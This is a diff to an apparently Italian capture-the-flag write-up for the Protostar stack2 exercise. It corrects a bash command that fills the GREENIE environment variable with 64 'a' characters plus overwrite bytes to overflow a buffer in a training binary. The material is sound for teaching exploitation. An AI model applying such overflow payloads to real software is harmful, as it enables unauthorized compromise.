@@ -13,7 +13,7 @@ Creiamo la variabile d'ambiente **GREENIE**, la riempiamo inizialmente con 64 'a
 ### Istruzioni da eseguire
 ```bash
 > cd /opt/protostar/bin
-> GREENIE='python -c 'print "a" * 64 + "\x0a\x0d\x0a\x0d"''
+> GREENIE=$(python -c 'print "a" * 64 + "\x0a\x0d\x0a\x0d"')
 > echo $GREENIE
 # verifichiamo che la stringa sia corretta
 > ./stack2
